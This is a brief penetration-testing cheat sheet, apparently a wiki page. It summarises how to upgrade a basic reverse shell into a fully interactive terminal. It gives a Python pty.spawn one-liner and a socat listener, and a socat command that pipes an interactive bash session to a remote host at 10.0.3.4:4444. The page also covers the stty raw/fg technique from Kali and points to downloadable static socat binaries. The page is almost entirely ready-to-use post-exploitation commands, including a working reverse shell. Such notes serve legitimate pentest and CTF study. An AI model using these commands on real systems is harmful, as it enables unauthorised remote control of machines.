<!-- TITLE: Pty Alloc -->
<!-- SUBTITLE: A quick summary of Pty Alloc -->

From https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
# Python method
```
python -c 'import pty; pty.spawn("/bin/bash")'  
```

# Socat
Listening side
```
socat file:`tty`,raw,echo=0 tcp-listen:4444  
```

```
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444  
```

Fetch static socat if necessary from https://github.com/andrew-d/static-binaries

# STTY Option
In reverse shell
```
$ python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z
```

In Kali
```
$ stty raw -echo
$ fg
```

In reverse shell
```
$ reset
$ export SHELL=bash
$ export TERM=xterm-256color
$ stty rows <num> columns <cols>
```
